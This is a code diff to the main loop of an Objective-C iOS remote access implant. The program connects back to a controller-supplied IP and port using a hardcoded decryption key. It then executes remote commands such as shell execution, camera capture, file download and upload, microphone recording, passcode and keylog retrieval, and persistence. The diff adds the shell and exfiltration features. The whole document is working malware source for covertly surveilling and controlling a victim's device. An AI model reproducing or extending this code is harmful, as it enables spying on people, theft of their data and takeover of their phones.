@@ -4,9 +4,13 @@
 //Copyright 2016 Lucas Jackson
 
 #include "espl.h"
+#import "eshelper.h"
 
-NSFileManager *filemanager = [NSFileManager alloc];;
+NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
+NSString *logfile = @"/tmp/.esplog";
+
 espl *_espl;
+BOOL debug = false;
 
 NSString *tmpData = @"";
 NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
@@ -14,33 +18,34 @@ NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
 NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
 @"ismuted",@"getpasscode",@"getpaste",@"unlock",@"keylog",@"lastapp",@"islocked",nil];
 
-
-int main(int argc, char **argv, char **envp) {
+int main(int argc, const char * argv[]) {
     _espl = [[espl alloc] init];
-    /*this actually fucks up the alert command idk why
-     [filemanager removeItemAtPath:[NSString stringWithFormat:@"%s",argv[0]] error:nil]; //delete self and cry
-    */
-    
-    [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];
-
     if (argc == 1) { return 0; }
+    
     //decrypt argument with shared key
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
-    argument = [escryptor decryptB64ToNSString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" :argument];
-    if (argument == NULL) {
-        HBLogDebug(@"its nil on the why");
+    argument = [escryptor decryptB64ToNSString:bkey :argument];
+    
+    //argument to json
+    NSError *initError = nil;
+    NSDictionary *initDictionary = [eshelper stringToJSON:argument :initError];
+    if (initError != nil) {
+        HBLogDebug(@"echo '%@' >> %@",initError,logfile);
+        return 0;
     }
-    //obtain real args from decrypted argument
-    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
-    //connect to host:port args
-    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
-    //set escryptor key from args
-    _espl.skey = args[2];
-    //set terminator from args
-    _espl.terminator = [args[3] substringToIndex:16];
-    //check if connection was accepted
+    //init params
+    NSString *ip = [initDictionary objectForKey:@"ip"];
+    HBLogDebug(@"echo '%@' >> %@",ip,logfile);
+    
+    int port = [[initDictionary objectForKey:@"port"] intValue];
+    _espl.skey = [initDictionary objectForKey:@"key"];
+    _espl.terminator = [initDictionary objectForKey:@"term"];
+    debug = [[initDictionary objectForKey:@"debug"] boolValue];
+    
+    //connect
+    int success = [_espl connect:ip :port];
     if (success == -1) {
-        HBLogDebug(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
+        HBLogDebug(@"couldnt establish connection %@ %d %@ %@",ip,port,_espl.terminator,_espl.skey);
     }
     else {
         NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
@@ -49,22 +54,58 @@ int main(int argc, char **argv, char **envp) {
         char buffer[2048];
         while (read(sockfd, &buffer, sizeof(buffer))) {
             //decrypt received data
-            command = [escryptor decryptB64ToNSString:_espl.skey :
-                       [NSString stringWithFormat:@"%s",buffer]];
-            //json decode
-            NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
-                                                                               options: NSJSONReadingAllowFragments
-                                                                                 error: nil];
+            command = [escryptor decryptB64ToNSString:_espl.skey : [NSString stringWithFormat:@"%s",buffer]];
+            //json decode decrypted received data
+            NSError *decodeError = nil;
+            NSDictionary *receivedDictionary = [eshelper stringToJSON:command :decodeError];
+            //if there was an error with our input, a message is helpful
+            if (decodeError != nil) {
+                if (debug) HBLogDebug(@"echo '%@' >> %@",command,logfile);
+                [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
+            }
             //assign
             NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
             NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
-            
+            NSString *cmdType = [receivedDictionary objectForKey:@"type"];
             _espl.terminator = [receivedDictionary objectForKey:@"term"];
+            
+            if (debug) [_espl eslog:command];
         
-            if ([cmd isEqualToString: @"exit"]) {
+            if ([cmdType isEqualToString:@"upload"]) {
+                if ([cmd isEqualToString: @"upload"]) {
+                    [_espl receiveFileData:cmdArgument :[[receivedDictionary objectForKey:@"filesize"] longValue]];
+                }
+            }
+            else if ([cmdType isEqualToString:@"download"]) {
+                [_espl eslog:@"running download command"];
+                NSData *rawdata = nil;
+                if ([cmd isEqualToString: @"frontcam"]) {
+                    [_espl eslog:@"calling espl frontcam"];
+                    rawdata = [_espl camera:true];
+                }
+                else if ([cmd isEqualToString: @"backcam"]) {
+                    [_espl eslog:@"calling espl backcam"];
+                    rawdata = [_espl camera:false];
+                }
+                else if ([cmd isEqualToString: @"download"]) {
+                    rawdata = [_espl filePathToData:cmdArgument];
+                }
+                else {
+                    [_espl sendString:[NSString stringWithFormat:@"unable to perform %@",cmd]];
+                }
+                [_espl eslog:@"about to send rawdata"];
+                if (rawdata != NULL && rawdata.length > 0) {
+                    [_espl eslog:[NSString stringWithFormat:@"sending rawdata %d",rawdata.length]];
+                    [_espl sendFileData:rawdata];
+                }
+                else {
+                    [_espl eslog:@"data is null"];
+                }
+            }
+            else if ([cmd isEqualToString: @"exit"]) {
                 exit(1);
             }
-            else if ([cmd isEqualToString: @"getpid"]) {
+            else if ([cmd isEqualToString: @"pid"]) {
                 [_espl getPid];
             }
             else if ([cmd isEqualToString: @"vibrate"]) {
@@ -79,6 +120,10 @@ int main(int argc, char **argv, char **envp) {
             else if ([cmd isEqualToString: @"ls"]) {
                 [_espl directoryList:cmdArgument];
             }
+            else if ([cmd isEqualToString: @"sh"]) {
+                [_espl exec:cmdArgument];
+                [_espl blank];
+            }
             else if ([cmd isEqualToString: @"cd"]) {
                 [_espl changeWD:cmdArgument];
             }
@@ -86,10 +131,7 @@ int main(int argc, char **argv, char **envp) {
                 [_espl rmFile:cmdArgument];
             }
             else if ([cmd isEqualToString: @"pwd"]) {
-                [_espl sendString:filemanager.currentDirectoryPath];
-            }
-            else if ([cmd isEqualToString: @"download"]) {
-                [_espl download:cmdArgument];
+                [_espl sendString:_espl.fileManager.currentDirectoryPath];
             }
             else if ([cmd isEqualToString: @"setvol"]) {
                 [_espl setVolume:cmdArgument];
@@ -105,12 +147,6 @@ int main(int argc, char **argv, char **envp) {
             }
             else if ([cmd isEqualToString: @"dial"]) {
                 [_espl dial:cmdArgument];
-            }
-            else if ([cmd isEqualToString: @"frontcam"]) {
-                [_espl camera:true];
-            }
-            else if ([cmd isEqualToString: @"backcam"]) {
-                [_espl camera:false];
             }
             else if ([cmd isEqualToString: @"mic"]) {
                 [_espl mic:cmdArgument];
@@ -138,7 +174,7 @@ int main(int argc, char **argv, char **envp) {
                 [_espl say:[command stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
             }
             else if ([cmd isEqualToString: @"persistence"]) {
-                [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
+                [_espl persistence:ip :port];
             }
             else if ([cmd isEqualToString: @"rmpersistence"]) {
                 [_espl rmpersistence];
